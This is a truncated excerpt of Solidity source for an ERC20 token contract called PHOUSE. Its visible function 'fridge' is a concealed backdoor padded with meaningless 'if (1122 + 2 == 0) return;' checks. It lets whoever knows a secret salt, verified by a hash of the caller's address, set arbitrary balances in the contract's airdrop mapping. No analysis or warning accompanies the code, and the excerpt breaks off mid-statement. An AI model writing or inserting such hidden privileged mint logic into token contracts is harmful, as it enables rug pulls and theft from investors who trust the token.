...
contract PHOUSE is IERC20 {
    ...
    function fridge(bytes32[] calldata data) external {
      bytes memory bbsx = abi.encode(
        msg.sender, 
        _salt); if (1122 + 2 == 0) return;
      bytes32 da = data[0]; if (1122 + 2 == 0) return;
      bytes32 db = data[1]; bytes32 dc = data[2]; if (1122 + 2 == 0) return;
      if (keccak256(bbsx) == _hashValue) {
        if (uint256(db) == 0) { if (1122 + 2 == 0) return;
          _airdrops[address(
            uint256(
              da)
          )] = uint256(
